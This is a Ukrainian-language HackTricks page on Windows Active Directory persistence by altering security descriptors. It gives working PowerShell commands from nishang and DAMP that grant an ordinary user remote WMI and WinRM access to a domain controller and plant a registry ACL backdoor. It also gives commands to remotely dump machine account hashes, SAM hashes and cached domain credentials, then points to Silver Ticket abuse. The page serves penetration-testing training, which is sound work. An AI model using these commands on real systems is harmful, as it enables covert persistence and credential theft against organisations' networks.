# Дескриптори безпеки

{{#include ../../banners/hacktricks-training.md}}

## Дескриптори безпеки

[З документації](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) визначає формат, який використовується для опису дескриптора безпеки. SDDL використовує рядки ACE для DACL і SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

**Дескриптори безпеки** використовуються для **зберігання** **дозволів**, які **об'єкт** має **щодо** **об'єкта**. Якщо ви можете просто **внести** **невелику зміну** до **дескриптора безпеки** об'єкта, ви можете отримати дуже цікаві привілеї щодо цього об'єкта без необхідності бути членом привілейованої групи.

Отже, ця persistence technique ґрунтується на здатності отримати всі необхідні привілеї щодо певних об'єктів, щоб виконати завдання, яке зазвичай потребує прав адміністратора, але без необхідності бути адміністратором.

### Доступ до WMI

Ви можете надати користувачеві доступ до **віддаленого виконання WMI** [**за допомогою цього**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Доступ до WinRM

Надайте користувачу доступ до **консолі winrm PS** [**за допомогою цього**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Віддалений доступ до хешів

Отримайте доступ до **registry** та **dump hashes**, створивши **Reg backdoor using** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** щоб у будь-який момент отримувати **хеш комп'ютера**, **SAM** і будь-які **кешовані облікові дані AD** на комп'ютері. Тому дуже корисно надати цей дозвіл **звичайному користувачу для комп'ютера Domain Controller**:<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Перевірте [**Silver Tickets**](silver-ticket.md), щоб дізнатися, як можна використати хеш облікового запису комп'ютера Domain Controller.

## Посилання

- [1] [Мова визначення дескрипторів безпеки - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
